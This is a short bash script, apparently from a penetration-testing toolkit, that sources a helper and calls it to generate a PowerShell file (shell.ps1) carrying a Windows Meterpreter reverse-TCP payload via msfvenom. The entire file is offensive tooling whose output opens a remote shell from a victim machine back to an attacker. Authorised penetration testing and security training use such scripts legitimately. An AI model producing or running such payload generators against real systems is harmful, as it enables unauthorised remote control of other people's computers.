#!/bin/bash

: '
Create PS1 file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="windows/meterpreter/reverse_tcp"
format="psh"
filename="shell.ps1"

create_reverse_shell "${payload}" "${format}" "${filename}"
